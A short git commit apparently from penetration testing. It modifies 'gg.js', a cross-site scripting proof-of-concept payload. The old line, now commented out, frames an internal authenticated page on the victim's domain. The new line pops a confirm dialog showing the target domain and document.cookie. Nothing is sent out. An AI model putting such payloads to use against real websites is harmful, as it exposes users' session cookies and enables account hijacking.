dd2567a0aa8c1d6491b19d5aebfe0e8bc509b8e6
Exon <exon038@gmail.com>
2026-06-20 11:41:17 +0200

    Update gg.js

--- gg.js
+++ gg.js
@@ -1,1 +1,2 @@
-var s = document.createElement('iframe'); s.src = `https://${window.document.domain}/icd/cbo/index-react-authsec.html#/synthese`; s.style.width='800px'; s.style.height='600px'; document.body.appendChild(s);
+//var s = document.createElement('iframe'); s.src = `https://${window.document.domain}/icd/cbo/index-react-authsec.html#/synthese`; s.style.width='800px'; s.style.height='600px'; document.body.appendChild(s);
+if (confirm('Cible : ' + document.domain + '\n\n' + 'Cookie : ' + document.cookie) === true) {window.close()};
